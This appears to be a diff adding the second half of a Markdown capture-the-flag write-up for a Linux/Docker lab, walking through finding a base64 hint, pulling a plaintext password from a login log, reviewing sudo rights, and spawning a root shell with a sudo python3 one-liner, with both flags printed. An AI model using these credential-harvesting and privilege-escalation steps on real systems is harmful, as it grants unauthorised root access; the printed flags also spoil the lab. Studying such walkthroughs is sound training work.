@@ -156,3 +156,70 @@ I got,
 .user.txt : CTF{L1nux_D0ck3r_1s_Aw3s0me}
 ___
 
+## After searching: there is a hint saying 
+
+with this command:
+```bash
+find / -type f -name "*.txt" 2>/dev/null
+```
+![[Pasted image 20250124213416.png]]
+
+Hint.txt:
+![[Pasted image 20250124213458.png]]
+
+base64 decoder: https://www.base64decode.org/
+![[Pasted image 20250124213548.png]]
+
+generally, log in located in /var/log. So, let's check logs.
+___
+
+After just listing the file there was the sus looking log file **system_login.log**
+we find plaintext password inside it.
+![[Pasted image 20250124213818.png]]
+Command:
+```bash
+grep ram_jhakri /var/log/login_system.log
+```
+password: Password123
+
+___
+
+Interesting thing is that we can run **sudo** command .
+
+command:
+```bash
+sudo -l
+```
+![[Pasted image 20250124214049.png]]
+
+### Permissions Breakdown:
+
+1. **User `ram_jhakri` can run the following commands:**
+    - `(ALL) NOPASSWD: ALL`
+        - **Meaning**: The user can run **any command as any user without entering a password**, but there are exceptions (`!` entries).
+    - `!, /bin/rm, /usr/bin/rm`
+        - **Exception**: The user **cannot run `rm`** (the command to remove files or directories) either from `/bin/rm` or `/usr/bin/rm`.
+    - `(ALL) NOPASSWD: /usr/bin/python3`
+        - **Meaning**: The user can specifically run `/usr/bin/python3` as any user without a password.
+
+### What This Means:
+
+1. The user has **very broad `sudo` privileges** but cannot directly use `rm`.
+2. The ability to run `/usr/bin/python3` with `sudo` is significant, as Python allows execution of arbitrary commands via the `os` or `subprocess` modules.
+
+___
+### Let's try to expoit this a get root.
+link: https://gtfobins.github.io/gtfobins/python/#shell
+command:
+```bash
+sudo python3 -c 'import os; os.system("/bin/sh")'
+```
+After this we can get root.
+
+
+![[Pasted image 20250124214330.png]]
+
+root flag: CTF{L1nux_E5ca1ation_1s_Aw3s0me}
+
+## End
+
